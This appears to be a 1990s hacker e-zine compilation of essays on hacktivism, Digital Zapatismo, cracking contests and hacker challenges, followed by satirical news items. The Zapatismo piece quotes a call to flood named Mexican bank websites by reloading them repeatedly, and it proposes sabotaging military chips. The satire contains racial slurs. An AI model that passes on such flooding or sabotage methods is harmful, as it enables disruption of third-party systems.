      Undoubtedly there will be disagreement as to how effective a particular technique is or isn't. But it seems that if new methods are created
      in an environment of experimentation, then valid critiques will be taken into consideration and used to redesign or alter plans and
      strategies. However, there are some technical critiques that are actually much more ideologically based than it would first seem. For
      example there is a certain tendency to reify bandwidth and from that viewpoint any action that clogs or diminishes bandwidth is
      considered negative. So then, technical critiques can be value-laden with particular stances toward the Internet infrastructure. 

      Despite the current levels of political, tactical, and technical questions that are being raised about hacktivism et al, it seems to be an area
      that is in a period of expansion, rather than contraction. And it generally seems that this critique and questioning is healthy and useful for
      the refinement of the practice. 

      As just mentioned, some technical critiques are bound together with ideological pre-dispositions and are therefore also political questions,
      and perhaps even ethical questions of appropriateness. To judge blocking a web site, or clogging the pipelines leading up to a web site, is
      to take an ethical position. If the judgement goes against such activity, such an ethical position is likely to be derived from an ethical code
      that values free and open access to information. But there are alternative sets of values that justifies, for example, the blocking of access
      to web sites. These differences in beliefs over the nature of the Internet infrastructure are among people who are basically on the same
      side when it comes to most political questions. Some of these differences will probably be worked out as the subject and practice
      matures, while there may remain clear divisions. 

      Last but not least, the more prosecutorial minded are apt to pass judgement on the appropriateness or inappropriateness of certain forms
      of hacktivism based on where the actions stand with respect to the law. While it is true that some forms of hacktivity are fairly easy to see
      as being outside the bounds of law - such as entering into systems to destroy data - there are other forms that are more ambiguous and
      hover much closer to the boundary between the legal and the illegal. Coupled with this ambiguity are other factors that tend to cloud the
      enforceability or prosecuteability of particular hacktivist offenses. Jurisdictional factors are key here. The nature of cyberspace is
      extraterritorial. People can easily act across geographic political borders, as those borders do not show themselves in the terrain. Law
      enforcement is still bound to particular geographic zones. So there is a conflict between the new capabilities of political actors and the old
      system to which the law is still attached. This is already beginning to change and legal frameworks, at the international level, will be
      mapped on to cyberspace. 

      This section does not do justice to the full range of critiques that can be identified and described, and further exploration of the subject of
      direct action Net politics should make sure such a deeper analysis is taken. The intention here has been more so to develop a greater
      understanding of these new forms of electronic action and to only mention a few overarching critiques so as to not give the impression
      that this is moving forward without resistance. Quite the contrary is true. It seems that hacktivity has met and will meet resistance from
      many quarters. It doesn't seem as if opposition to hacktivist ideas and practices falls along particular ideological lines either. 

      Conclusion 

      Several things seem to be clear at this point. The first is that hacktivism, as defined across the full spectrum from relatively harmless
      computerized activism to potentially dangerous resistance to future war, is a phenomena that is on the rise. Second, as just eluded to,
      hacktivism represents a spectrum of possibilities that exists in some combination of word and deed. On the one end of the spectrum is
      pure word. On the other end of the spectrum is pure deed. Computerized activism hovers closer to pure word, while the successive
      portals moves closer toward pure deed. Third, along with this tendency towards transgression, towards giving value to actions that move
      beyond words and that sees the Internet infrastructure also as a site for action, there comes with this a critique and resistance. Despite
      this critique hacktivism is likely to continue to spread, but perhaps modified to accommodate some of the criticism. Fourth, with its
      continued spread, modified by critique or not, hacktivism is also likely to continue to gain attention. While media coverage may eventually
      drop off if or when hacktivism becomes more commonplace, at this point the way in which hacktivism is being represented is still new
      enough to warrant media attention for the foreseeable near future. 

      What remains unclear about hacktivism emerges when we start to ask questions like: what does this mean and where is this going? While
      we can claim with a fair degree of certainty that hacktivism is on the rise, there is little way to tell where it will lead to and the significance
      or lack there of that it will or might obtain. Moreover, there are aspects of hacktivism that still need to be explored. For example, the
      entire issue of extraterritoriality, of the Internet not being bound to any particular geographic region and the difficulties that poses for law
      enforcement, is one area that deserves further attention. 

      One reason why it is difficult to get a firm grip on hacktivism's direction, in addition to simply saying that it is too early to tell, is that
      hacktivism will evolve in response to changing global economic and political conditions. As it is hard to predict trends and directions in
      the global economy, it too, then, becomes hard to predict events that will be linked to those meta shifts. 

      Nevertheless, some people are trying to understand and make sense out of where hacktivism could go, although they might not be doing
      so using the particular word 'hacktivism' to describe this activity. Governments and corporations are keenly concerned, for example,
      about network security. To get some indications about the forecast for hacktivism in the 21st century it may be very useful to examine
      what these sorts of institutions are saying and how they are preparing to defend themselves. 

      It could very well be that governments might impose severe regimes that successfully curtail hacktivism. If so, 1998 might be seen at
      some point as the glory days, when hacktivist experiments were able to go largely unchallenged, because the mechanisms of the state had
      not yet been in place to deal with the new phenomena. Or it could be that hacktivism is able to successfully remain several steps out in
      front of law enforcement efforts, or that too many people become involved that enforceability remains problematic. Again, it is difficult to
      know any of this. 

      Finally, while we can speak with some clarity about facets of hacktivism and also point to aspects of it that remain ambiguous and
      unforeseen, there is an overarching concern that comes from this discussion that deserves more attention. Specifically arising out of the
      consideration of the fifth portal, Resistance to Future War, what are the long term consequences posed for governments and states if
      individuals, non-state actors, can engage in forms of cyberspacial resistance across traditional geo-political borders? This is an important
      question raised by this discussion and one that demands more attention to answer properly. But it seems clear already that we are at the
      onset of a new way of thinking about, participating in, and resisting war, and that today's nascent hacktivity is part of the trajectory
      towards that new way.

 SP.02 "Digital Zapatismo"
       ~~~~~~~~~~~~~~~~~~~
       
       Digital Zapatismo

       http://www.freespeech.org/resistance/texts/DigZap.html
       by Ricardo Dominguez
       http://www.thing.net/~rdom/
         
       
       
       Zapatismo has infected the political body of Mexico's "perfect dictatorship" since January 1, 1994. This polyspacial movement for a radical democracy based on the Mayan legacies of
       dialogue ripped into the electronic fabric not as InfoWar--but as virtual actions for real peace in the real communities of Chiapas. As of September 1997 reports of The Mexican military
       training and arming paramilitary groups with the intent of moving the "low-intensity" war to higher level began to circulate among the Zapatista Network. It took the massacres at Acteal
       to focus the world on something that was already known--the constant tragedy of late-capital. 
       
       As manifestations took place around the world in remembrance of the Acteal dead on January 1 and 2nd, the Mexican military with the full support of the PRI government began the next
       stage of the war against peace. As the West stumbled about in celebration of a new year--the first report reached out across the net and slapped us awake once more with the brutal
       reality of the neo-liberal agenda. 
       
       1.0 Beta Actions 
       
       This time Zapatista Networks responded with a new level of electronic civil disobedience beyond the passing of information and emailing presidents. On Sunday the 18th of January 1998
       a call for NetStriking for Zapata (from Anonymous Digital Coalition) came in via email with the following instructions: 
       
       In solidarity with the Zapatista movement we welcome all netsurfers with ideals of justice, freedom, solidarity and liberty within their hearts, to a virtual sit-in. On January 29, 1998 from
       4:00 p.m. GMT (Greenwich Mean Time) to 5:00 p.m. (in the following five web sites, symbols of Mexican neoliberalism): 
       
            Bolsa Mexicana de Valores: http://www.bmv.com.mx 
            Grupo Financiero Bital: http://www.bital.com.mx 
            Grupo Financiero Bancomer: http://www.bancomer.com.mx 
            Banco de Mexico: http://www.banxico.org.mx 
            Banamex: http://www.banamex.com
       
       Technical instructions: Connect with your browser to the upper mentioned web sites and push the bottom "reload" several times for an hour (with in between an interval of few seconds).
       
       This virtual sit-in not only brought the possibilities of direct electronic actions to the forefront of the Zapatista networks, it also initiated a more focused analysis of what methods of
       electronic civil disobedience might work. Several questions were brought up on the issues of net traffic, ISPs, and small international pipes. Speculations on the technological
       implications of these actions began to focus on questions of Who is most likely to be damaged by this move? The Mexican target banks or the Internet Service Providers, ISPs, who
       route data to these banks? 
       
       As these discussions were taking place a group of Mexican digital activist on February 4, 1998 hacked into a Mexican government home page on the Internet and placed pro-Zapatista
       slogans on the front pages of  the site. Soon afterwards an MS Dos Ping Action program from the ECD group arrived to hit Mexican Banks and Chase Manhattan Bank on February 9. 
       
       The next level of possible ECD began to emerge at the end of February: an automatic mail engine from the New Humans and Java based site that automatically began to PING the Britsh
       Mexican Embassy URL every 7 seconds once you logged-in. 
       
       2.0  InfoWar 
       
       To move beyond these Beta actions we need to map the general condition of  InfoWar at this shifting point in time. 
       
       Command and control systems (CCS) within the Military and Intelligence Communities have been re-shifting their definition of war for sometime. That surveillance systems like Project
       Echelon would become a priority is no surprise. The NSA (National Security Agency) and the (NRO) National Reconnaissance Office have been working on implementing new functions
       for themselves since the end of the post-Cold War. 
       
       They had to re-invent themselves into hyper-surveillance networks that can accomplish defensive intelligence gathering and rapid containment missions for the lowest cost possible.
       Now it is more 
        important to attack an opponents information infrastructure, than it is to destroy its armies. Actions, like the Gulf War, are now only useful for limited screenal political gambits. 
       
       The enemy is now hosted by the global public commercial networks. InfoWar tactics must now maintain a constant analysis of all information flows and a continuous tracking of the
       backbone routes.  In search of the most effective way to bring down specific zones of resistance within an enemies political or economic structures: 
         
       
            1. Commercial communication systems. 
            2. Broadcasting networks. 
            3. Financial data systems. 
            4. Transportation systems 
            5. Internet Server networks.
       
       Of course one of the problems faced by these IW scenarios is that military and intelligence systems here are also routed within public commercial lines. 
       
       The scenarios of possible implosions faced by the decentralization of command and control are increasing at a co-equal rate with the speed of access to hardware, software, and training.
       Late Capital demands that this equation grow even faster and to the farthest reaches of the globe. 
       The necessity of the rule of association and strategic coalitions between military and intelligence networks with mega corporation webs, universities, independent ISP´s, electronic
       political cells, individual research and analysis creates a general state of pan-anarchy. 
       
       Thus IWW (Information World War) has already started and it is haunted by its own shadow. It must face the task of dealing with an open network that has at least 5 vulnerabilities: 
         
       
            1. Bottom-up architecture. 
       
            2. Multiple distribution points. 
       
            3. Memetic networks (MMN): independent networks which coordinate without the unification of a central command. 
       
            4. Non linearity and complexity effects: where simple interactions lead to unpredictable outcomes. 
       
            5. Constant states of emergency: all systems are always already not enough and must be constantly upgraded.
       
       In order to deal with this growing vulnerability of the electronic infrastructure with the on set InfoWar. The State has redefined command, control, intelligence and resistance. InfoWar
       tactics are now moving beyond the theoretical questions about the rise of "network power" and the end of hierarchies. Instead, Military and Intelligence groups are now experimenting
       with pragmatic hybrid structures that can retain control over networks, while allowing network autonomy to expand within a specific types of command structures. In order to contain the
       rising soft power of small groups that can organize themselves "into sprawling networks" threatening hard power structures. 
       
       3.0  Hacking the Future 
       
       Digital Zapatismo has always been an open system of sprawling networksthis has been the force multiplier of the movement. It used digital cultures most basic system of exchange,
       e-mail between people to disturb the Informatic State. Now that we know that they are using, as we always suspected, hyper-surveillance filters to regain control of the network. 
       
       We must begin to invent other methods of Electronic Civil Disobedience: 
         
       
            1. Alternative networks with more access and bandwidth. More projects like Name.space attacking the control of the root.name structures by Internic. 
       
            2.  Deep programming: Creating Spiders, Bots, and other (minor network agents) to move against specific URLs without interrupting the Server. The first Zapatista Spider should
            be available by the end of May. 
       
            3.  Offshore Domains: To maintain spamming engines for massive e-mail actions. 
       
            4.  Virtual proximity capabilities: Create simple access systems for Real Time intercontinental electronic communication. These types of systems would disable the possibility of
            surveillance. A proto-type has been developed by Thing.netThe Thing Connector 3.0. 
       
            5.  Satellites: To gather a fund among alternative networks to buy our own Satellite. Giving us autonomy from controlled networks and backbones. The Nettime community has
            been discussing the possibility. 
       
            6. Jamming Chips: Jamming by cells of highly trained cells could systematically disrupt wide areas of sensitive networks. These micro-squads could slip basic disturbances into
            the chips bought by the U.S military-entertainment complex from foreign countries. Many of these elements are part of a wide range of defensive and offensive weapon
            systems--that could induce  a general dysfunction in performance at a pre-set time.
       
       The Zapatista Networks, in the spirit of Chiapas are developing methods of electronic disturbance as sites of invention and political action for peace. At this point in time it is difficult to
       know how much of a disturbance these acts of electronic civil disobedience specifically make. What we do know is that neoliberal power is extremely concerned by these acts. 
       
       Since Jan 1, 1994 the analysis of the Zapatista Electronic Movement has been at the top of the list of the Military and Intelligence research agenda. For now all we can do is continue to
       forge ahead and always remember that all of this electronic activism is about a real community in search of a real peace. A community that has been calling for a world the makes all worlds
       possible.

 SP.C1 The Phallusy of cracking contests, (how big is yours?)
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       

           The Fallacy of Cracking Contests
       
       
       
       
       You see them all the time: "Company X offers $1,000,000 to anyone who can
       break through their firewall/crack their algorithm/make a fraudulent
       transaction using their protocol/do whatever."  These are cracking
       contests, and they're supposed to show how strong and secure the target of
       the contests are.  The logic goes something like this:  We offered a prize
       to break the target, and no one did.  This means that the target is secure.
       
       
       It doesn't.
       
       
       Contests are a terrible way to demonstrate security.  A
       product/system/protocol/algorithm that has survived a contest unbroken is
       not obviously more trustworthy than one that has not been the subject of a
       contest.  The best products/systems/protocols/algorithms available today
       have not been the subjects of any contests, and probably never will be.
       Contests generally don't produce useful data.  There are three basic
       reasons why this is so.
       
       
       1.  The contests are generally unfair.  
       
       
       Cryptanalysis assumes that the attacker knows everything except the secret.
       He has access to the algorithms and protocols, the source code,
       everything.  He knows the ciphertext and the plaintext.  He may even know
       something about the key.
       
       
       And a cryptanalytic result can be anything.  It can be a complete break: a
       result that breaks the security in a reasonable amount of time.  It can be
       a theoretical break: a result that doesn't work "operationally," but still
       shows that the security isn't as good as advertised.  It can be anything in
       between.
       
       
       Most cryptanalysis contests have arbitrary rules.  They define what the
       attacker has to work with, and how a successful break looks.  Jaws
       Technologies provided a ciphertext file and, without explaining how their
       algorithm worked, offered a prize to anyone who could recover the
       plaintext.  This isn't how real cryptanalysis works; if no one wins the
       contest, it means nothing.
       
       
       Most contests don't disclose the algorithm.  And since most cryptanalysts
       don't have the skills for reverse-engineering (I find it tedious and
       boring), they never bother analyzing the systems.  This is why COMP128,
       CMEA, ORYX, the Firewire cipher, the DVD cipher, and the Netscape PRNG were
       all broken within months of their disclosure (despite the fact that some of
       them have been widely deployed for many years); once the algorithm is
       revealed, it's easy to see the flaw, but it might take years before someone
       bothers to reverse-engineer the algorithm and publish it.  Contests don't
       help.
       
       
       (Of course, the above paragraph does not hold true for the military.  There
       are countless examples successful reverse-engineering--VENONA, PURPLE--in
       the "real" world.  But the academic world doesn't work that way,
       fortunately or unfortunately.)
       
       
       Unfair contests aren't new.  Back in the mid-1980s, the authors of an
       encryption algorithm called FEAL issued a contest.  They provided a
       ciphertext file, and offered a prize to the first person to recover the
       plaintext.  The algorithm has been repeatedly broken by cryptographers,
       through differential and then linear cryptanalysis and by other statistical
       attacks.  Everyone agrees that the algorithm was badly flawed.  Still, no
       one won the contest.
       
       
       2.  The analysis is not controlled.
       
       
       Contests are random tests.  Do ten people, each working 100 hours to win
       the contest, count as 1000 hours of analysis?  Or did they all try the same
       things?  Are they even competent analysts, or are they just random people
       who heard about the contest and wanted to try their luck?  Just because no
       one wins a contest doesn't mean the target is secure...it just means that
       no one won.
       
       
       3.  Contest prizes are rarely good incentives.  
       
       
       Cryptanalysis of an algorithm, protocol, or system can be a lot of work.
       People who are good at it are going to do the work for a variety of
       reasons--money, prestige, boredom--but trying to win a contest is rarely
       one of them.  Contests are viewed in the community with skepticism: most
       companies that sponsor contests are not known, and people don't believe
       that they will judge the results fairly.  And trying to win a contest is no
       sure thing: someone could beat you, leaving you nothing to show for your
       efforts.  Cryptanalysts are much better off analyzing systems where they
       are being paid for their analysis work, or systems for which they can
       publish a paper explaining their results.
       
       
       Just look at the economics.  Taken at a conservative $125 an hour for a
       competent cryptanalyst, a $10K prize pays for two weeks of work, not enough
       time to even dig through the code.  A $100K prize might be worth a look,
       but reverse-engineering the product is boring and that's still not enough
       time to do a thorough job.  A prize of $1M starts to become interesting,
       but most companies can't afford to offer that.  And the cryptanalyst has no
       guarantee of getting paid: he may not find anything, he may get beaten to
       the attack and lose out to someone else, or the company might not even pay.
       Why should a cryptanalyst donate his time (and good name) to the company's
       publicity campaign?
       
       
       Cryptanalysis contests are generally nothing more than a publicity tool.
       Sponsoring a contest, even a fair one, is no guarantee that people will
       analyze the target.  Surviving a contest is no guarantee that there are no
       flaws in the target.
       
       
       The true measure of trustworthiness is how much analysis has been done, not
       whether there was a contest.  And analysis is a slow and painful process.
       People trust cryptographic algorithms (DES, RSA), protocols (Kerberos), and
       systems (PGP, IPSec) not because of contests, but because all have been
       subjected to years (decades, even) of peer review and analysis.  And they
       have been analyzed not because of some elusive prize, but because they were
       either interesting or widely deployed.  The analysis of the fifteen AES
       candidates is going to take several years.  There isn't a prize in the
       world that's going to make the best cryptanalysts drop what they're doing
       and examine the offerings of Meganet Corporation or RPK Security Inc., two
       companies that recently offered cracking prizes.  It's much more
       interesting to find flaws in Java, or Windows NT, or cellular telephone
       security.
       
       
       The above three reasons are generalizations.  There are exceptions, but
       they are few and far between.  The RSA challenges, both their factoring
       challenges and their symmetric brute-force challenges, are fair and good
       contests.  These contests are successful not because the prize money is an
       incentive to factor numbers or build brute-force cracking machines, but
       because researchers are already interested in factoring and brute-force
       cracking.  The contests simply provide a spotlight for what was already an
       interesting endeavor.  The AES contest, although more a competition than a
       cryptanalysis contest, is also fair 
       
       
       Our Twofish cryptanalysis contest offers a $10K prize for the best negative
       comments on Twofish that aren't written by the authors.  There are no
       arbitrary definitions of what a winning analysis is.  There is no
       ciphertext to break or keys to recover.  We are simply rewarding the most
       successful cryptanalysis research result, whatever it may be and however
       successful it is (or is not).  Again, the contest is fair because 1) the
       algorithm is completely specified, 2) there are no arbitrary definition of
       what winning means, and 3) the algorithm is public domain.
       
       
       Contests, if implemented correctly, can provide useful information and
       reward particular areas of research.  But they are not useful metrics to
       judge security.  I can offer $10K to the first person who successfully
       breaks into my home and steals a book off my shelf.  If no one does so
       before the contest ends, that doesn't mean my home is secure.  Maybe no one
       with any burgling ability heard about my contest.  Maybe they were too busy
       doing other things.  Maybe they weren't able to break into my home, but
       they figured out how to forge the real-estate title to put the property in
       their name.  Maybe they did break into my home, but took a look around and
       decided to come back when there was something more valuable than a $10,000
       prize at stake.  The contest proved nothing.

       Hacker Challenges -- Boon or Bane?
       
       (From Cipher, an infowar publication located at

       Jon Wiederspan, and Jeff Weinstein
       ______________________________________________________________________
       In the past year, several businesses have made resources publicly available on
       the Internet and challenged all comers to find bugs in them or break into them.
       Incentives offered to those who reported valid break-ins or bugs have ranged
       from T-shirts to cold cash. Recently, Gene Spafford of Purdue University
       decried this growing practice in a message circulated widely on the Internet. 
       Cipher has obtained responses from some of the organizations who have
       sponsored challenges of one sort or another, and circulating them along with
       that note. We thank Prof. Spafford and the organizations who responded to our
       request for comments. 
       
       A Few Comments on "Hacker Challenges"
       +++++++++++++++++++++++++++++++++++++
       by Eugene H. Spafford, COAST Laboratory Director, Purdue University
       http://www.cs.purdue.edu/people/spaf
       
       I note with dismay the increasing number of "hacker challenges" used in
       marketing security products. I think these are actually harmful to the
       profession and practice of security, rather than helpful. I believe the
       harm comes in two ways: (1) the challenges don't serve as any real test
       of the products, and it denigrates security professionals by suggesting
       that they should accept them as proof of security; and (2) it helps
       reinforce the image that there should be some form of reward for
       hacking through security measures. Neither of these are views we should
       responsibly seek to promote.
       
       Consider the nature of showing the security of a product. Does a
       "challenge" meet the goal of testing, which is to increase one's
       confidence in the correct functioning of the artifact? It really
       doesn't, for a number of reasons:
        o Few such "challenges" are conducted using established testing
          techniques. They are ad hoc, random tests. Thus, there is no way of
          determining final coverage. For instance, if 90% of all challenge
          attacks are of the same variety, what has the "test" really shown?
          (Consider testing a calculator. If you perform 10,000 tests, but
          9000 of them are addition with zero, have you done a thorough job of
          testing?)
        o That no problems are found does not mean that no problems exist. It
          may mean that the testers didn't expose them. Doing random,
          black-box testing remotely is not likely to really test much of the
          product. (Challenge testing is basically a form of black-box
          testing.)
        o That no problems are reported does not mean that no problems exist.
          The "testers" might not have recognized them. (Look at how often
          software is released with bugs, even after careful scrutiny -- users
          don't always recognize anomalies.)
        o That no problems are reported does not mean that no problems exist.
          How do you know that the "testers" will report what they find? How
          do you know the vendor is getting accurate data? If Jane Random
          Hacker found a way to penetrate the product in a manner that vendor
          monitoring didn't expose, it is possible she'd find more profitable
          uses (later) for that information than informing the vendor about
          it. Further, because of possible problems with the law, hackers
          might not want to report success and draw attention to themselves.
        o Simply because the vendor does not report a successful penetration
          does not mean that one did not occur -- the vendor may choose not to
          report it because it would reflect poorly on its product, or not
          meet the narrow criteria for a "successful" penetration, or the
          vendor may not be able to detect it happened. (How can anyone
          outside prove otherwise?)
        o Seldom do the really good experts, on either side of the fence,
          participate in such exercises. Thus, anything done is usually done
          by amateurs. (The "honor" of having won the challenge is not
          sufficient to lure the good ones into the fray. Good consultants
          command fees of several thousand $$ per day in some cases -- why
          should they donate their time and names for what amounts to free
          consulting and advertising?)
       
       Also note that any such challenge also serves to aid potential hackers 
       in their later pursuits: 
        o It gives potential miscreants some period to practice breaking the
          system without penalty. Any other time spent hacking at one of these
          might result in legal action or worse. Isn't it nice the vendor is
          giving free practice time to the bad guys? I hope all the potential
          customers are equally pleased at this.
        o It gives miscreants an excuse if they are caught trying to break into the
          system later (e.g., "We thought the contest was still on.") This
          might well weaken any legal action taken later.
        o The vendor contest may actually even include some publication of
          hacks that don't work -- thus helping reduce the effort to
          compromise the system later.
       
       Furthermore, the whole process sends the wrong message -- that we
       should build things and then try to break them, or that there is some
       prestige or glory in breaking systems. That isn't what we need.
       Instead, we want to promote responsible behavior, using established
       methods. We need to establish that security is something best done by
       well-trained professionals, and that hacking into systems is not "job
       training". (I've argued this point in more detail in "Are Computer
       Break-Ins Ethical?", Journal of Systems and Software, Jan 1992, 17(1).)
       
       Good security should be carefully designed in and tested using
       established methods. Tiger teams have a role, but using them
       (especially ad hoc teams) as a major means of establishing safety is
       negligent. Security "contests" to demonstrate a system are worse, and
       should be viewed negatively by potential customers. It should be
       generally recognized that such contests cannot establish more than
       cursory confidence in a product, are not a good means of testing, and
       actually create a climate that may encourage or enable people to try to
       break the product after it is in use.
       
       If I was a potential customer of any security product, which of the
       following, somewhat exaggerated approaches would be more likely to
       convince me that a company had its act together? Which one is the
       company more likely to be seeking to sell based on smoke and mirrors?
        o Approach A: Our product was coded by a bunch of really talented
          hackers and former system crackers who learned everything they know
          on the IRC. We put our product up on the Internet for 6 months, and
          offered a nifty backpack and some money to anyone who could break
          in. No one claimed the prize. Obviously, ours is a superior
          product.
        o Approach B: Our company is certified as an ISO 9000 company. We
          used formal software engineering approaches to design and build our
          product, ending in full functional testing, D-U path testing, and
          statement coverage to 98%. We also hired well-known independent
          security experts A, B, and C under non-disclosure to examine the
          code and identify weaknesses, and then conduct field trials. Company
          X and University Y have also had the opportunity to examine and test
          our product, and none of them have found flaws.
       
       Approach "B" is clearly the one we want to encourage. Approach "A"
       encourages cycles of "penetrate and patch" and that is what is wrong
       with most mass-market software available today. However, vendors claim
       that Approach "A" is what sells more product than Approach "B," in part
       because it seems to inspire more confidence, and in part because it is
       cheaper to produce software if they don't use an approach like "B".
       
       If we, as a community and a profession, want better quality and more
       trustworthy products, we must begin to demonstrate it. The best way is
       in the marketplace, by showing a willingness to buy based on substance,
       and not flash. Saying "no" to attempts to sell us products based on
       "hacker challenges" is one way to do that.

       Most of Gene's points are very valid, and I agree with them. His points
       are aimed at challenges promoted by a company in order to show that a
       product is secure. On the other hand, the Community ConneXion
       challenges are promoted in order to show that a product is *insecure*.
       
       It's easy to prove insecurity, but hard to prove security. The
       vendor-supported challenges are trying to prove security, which is
       rather misguided. In proving insecurity though, our challenges are
       rather simple, as they only require one counter-example to be proven
       that a system is insecure.
       - - - - - - -
       Jon Wiederspan, ComVista (jon@comvista.com URL:
       http://www.comvista.com/) : 
       
       We received a very similar letter from Mr. Spafford when we first began
       our contest and posted an extensive reply on our site while it was in
       operation. I will summarize the main points for Cipher readers:
       
       1) Mr. Spafford says that these challenges are a poor way of testing
       software.  That is true, however it was never our purpose to test the
       software by running a challenge. The testing has been completed or we
       would not have been confident enough to place $10,000 on the line. The
       main purpose of our security challenge was to promote awareness of the
       existence of security options for Macintosh servers. It was never
       intended as proof of the security of the system or to replace rigorous
       testing.
       
       2) Mr. Spafford says that these contests promote hacking.  We disagree
       with that entirely. By his argument, the Daytona 500 is responsible for
       people driving too fast on highways. I think there are people who drive
       as if they are on a race track (one passed me this morning on my way to
       work) but it is clear that rules on the highway are different from
       rules on the race track and no court in the land would let a person get
       away with arguing differently. We clearly stated on our site the
       limitations of the contest including a warning that we were not
       condoning similar attacks on systems other than the one provided for
       the contest.
       
       3) Mr. Spafford says that these contests make it easier to break other
       systems.  Mr. Spafford is looking in the wrong place. Bulletin boards,
       newsletters, Web sites and more all exist with information on how to
       hack into systems. Books have been written on the subject, movies made,
       and special investigative reports offered on television all on the
       subject. Writing about what failed on our site will not help hackers
       significantly. Our site also did not provide free practice to hackers
       because *none of the attempts worked*. Practice is useless if you do
       not at some point succeed.
       
       4) Mr. Spafford says that it is wrong to test things by trying to break
       them.  I don't think he thought about what he was saying there. What is
       beta testing but an attempt to find where software will break? Stress
       testing for metal structures? Crash testing cars? It is a fact of life
       that part of testing a product is to find where it will fail, which
       means trying actively to break the product in a variety of ways.
       
       In summary, it is our opinion that Mr. Spafford's letter has no bearing
       on the challenge that we had online. He probably would have been better
       served by investigating our site more thoroughly before writing the
       letter.

       My quick reaction is that the Netscape Bugs Bounty is not a "hacker
       challenge". It is a way to reward users for helping to find bugs that
       get past us.  I don't think that we make any claims such as "our
       product must be secure because no one claimed our hacker prize". We
       also don't view the bug bounty as a replacement for our own QA efforts,
       but a supplement to it.

       IRC Security: Who to Trust 
       Contributed by siko
       Thursday - March 25, 1999. 02:35AM GMT 

           These days the IRC waters can be just as dangerous as a raging inferno.
       Op the wrong nick and you could lose an entire channel in a matter of
       seconds.

       "Anyone can download a script these days and deop the regular channel
       members these days. The old days you had to load up telnet.exe, these days
       you type /hack and you are good to go.", says IRC Security Expert Mark
       Winters. "If you are really skilled, you could even do what is known as 'riding
       a split'".

       Certain IRC Networks are not prone to this type of hostile attack, such as
       Dalnet and Undernet due to channel bots employed by the IRC network to
       prevent such actions. The only trade off in the matter is Dalnet and Undernet
       fucking blow.

       A recent example of a hostile takeover would include a short takeover of
       #wsvw1u, thought to be masterminded by 'vize' of Efnet. Vize held ops in the
       channel for several minutes while attempting to harass and threaten Innerpulse
       writer siko. Siko did not fret, however, since he noticed ops had been
       restored during the trash talk session vize was putting on. Upon being banned
       from #wsvw1u, vize entered #innerpulse, which was at the time opless to hurt
       the self-respect level of channel members by calling them 'lame.'. This highly
       original insult offended one member so much, he opened a windows nuker
       and proceded to nuke vize 8 times before finally parting the channel with the
       message "you will all be owned" (not in those letters... y0u w1ll 4ll b3
       0wned).

       What type of prevention are IRCOps on Efnet taking to stop hostile channel
       takeover artists like this one? Innerpulse contacted #us-opers and asked for
       answers.

       "It is believed that users are responsible for their own channels and their
       channels well being," said Disciple.

       After several minutes, Innerpulse learned Disciple was not an IRCOp and
       stopped giving a shit about his opinions.

       Ma$e Signs Deal With CDNow.com 
       Contributed by siko
       Thursday - March 25, 1999. 01:46AM GMT 

           Bad Boy rap artist, Ma$e, has signed a deal with CDNow.com to write
       and perform music aimed at Internet technologies. They will be compiled and
       released under the upcoming album 'Internet World', second to his platinum
       album, 'Harlem World'.

       "I was excited about the offer because sometimes I'm just kickin it with my
       homies on IRC and I get these ideas. I plan to rap about the trials and
       tribulations brought on by the Internet, including taking channels on IRC,
       packeting AntiOnline, playing all the ladies on America Online, among other
       things.", said Ma$e yesterday at an official press conference. "Hopefully this
       will let the world know about the struggles that exist on todays Internet."

       Ma$e's first song that he has started production on in the studio is called
       'Lookin at Me'. He shows off his lyrical prowess with lines such as 'Soon as I
       join the channel people is like damn who is he, and please, I hope he don't
       nuke me'. Another verse taking aim at 'lamers' goes: "And if you are a lamer,
       and you got a net girlie, don't be real committed, because Ma$e will net-bang
       her.".

       Staying true to the game, there are several skits included on the cd. Among
       the planned skits are Ma$e accidentally messing up his AOL Instant
       Messages and telling Shania he will meet her at 7pm when he meant to send
       the Instant Message to Faruka, a real black queen.

       Ma$e describes his everyday troubles waking up and signing on in his song
       'Niggaz Wanna DoS'. Ma$e shows he is a lyrical soldier with lines such as
       'You wanna fuck with Ma$e, you'll get your wig rocked nigga, You wanna
       fuck with Innerpulse, You'll get your IP nuked nigga.".

       The album should be out in late July, 1999. 
       
       
       Doonesbury Author Reveals Source of
       Information 
       Contributed by siko
       Wednesday - March 24, 1999. 09:11PM GMT 

           Doonesbury is a well known comic strip that runs in thousands of
       publications nationwide. The past couple strips run have included jargon from
       the cyberculture underground, such as script kiddie and newbie. What started
       as a portal to the public has swiftly turned into a mess.

       "In an effort to show off my computer skills, I used the expert term 'tracing the
       exploit to his isp number'", said G.B Trudea, the writer of Doonesbury. "But I
       guess after my latest strip its kind of hard to hide the fact that I figured this out
       in #rootworm of Undernet.".

       "He wanted to know about computer crimes so he could showcase them in
       this weeks strip. So basically I just told him everything I knew", said one
       hacker who goes by the handle 'vortek'. "I think its cool the public will
       understand what goes on behind the scenes. I mean, attention is the ultimate
       goal of a 13 year old abused child.."

       Innerpulse, although never a fan of Doonesbury in the past, has seen
       computer related material in Doonesbury before. Images portraying long
       nose, bony face geeks with glasses working hard at their computer 'hacking' is
       nothing new to the strip. What is new to the strip, is the legal action being
       brought against it by AntiOnline.com for its illegal use of the term "exploit", a
       term they believe they own rights to.

       NATO authorizes airstrikes on hackers
       
       Silicon Valley, California -- Chat rooms were unusually deserted, spammers went on panicked last-minute
       mail-bombing sprees and bomb shelters filled to overflowing today as gloom engulfed hackers waiting for
       NATO strikes.
       
       Hackers showed a mix of fear and defiance toward the Western military alliance, aware it could strike at any
       moment against strategic hacker targets after yet another embarrassing vandalism of a U.S. Department of
       Defense website.
       
       "This waiting for strikes is killing me," said w4r3z_f14r3, a 22-year-old student in the controversial Computer
       Science department at the Massachusetts Institute of Technology. "If they want to bomb us, they should do it
       now so I can get back to cracking Afterlife II."
       
       Graphics illegally uploaded to an Associated Press website accompanied a note which stated, "F1n1$h 7h1Z
       60mb1n9 0r f4c3 my uur47h, I 4m l337!!! H4x0rs un173!" The web server was quickly downed in a flurry of
       flamewars over the proper use of the word 'hacker' versus 'cracker' in the page.
       
       Many college-age hackers stayed home rather than attending school, though most admit they would have
       stayed home anyway.
       
       Y2K websites issued detailed FAQs to threatened hackers in case of bombing, including information on how
       long canned goods stay fresh in underground shelters, how to fix a misfiring diesel generator, and how to sow
       grain in the field with a plow and oxen.
       
       Bomb shelters, unused in emergency since DefCon 4, were cleaned up during the last NATO threat in August,
       when the alliance previously announced its intention to launch airstrikes at the notorious hacker group Cult of
